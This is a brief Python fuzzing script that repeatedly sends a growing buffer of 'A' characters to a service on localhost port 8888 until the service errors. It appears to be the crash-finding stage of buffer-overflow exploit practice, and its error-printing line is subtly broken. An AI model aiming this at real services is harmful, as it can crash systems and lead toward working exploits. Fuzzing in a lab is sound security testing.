import sys
import socket
from time import sleep

junk  = "A" * 1000

# Establish Connection and Send Junk
while True:
	try:
		conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		conn.connect(("127.0.0.1",8888))
		conn.send(junk)
		conn.close()
		sleep(1)
		print("Junk Size is : "+str(len(junk)))
		junk = junk + "A" * 50
	except Exception as error:
		print("Error Occur " + error)
		sys.exit()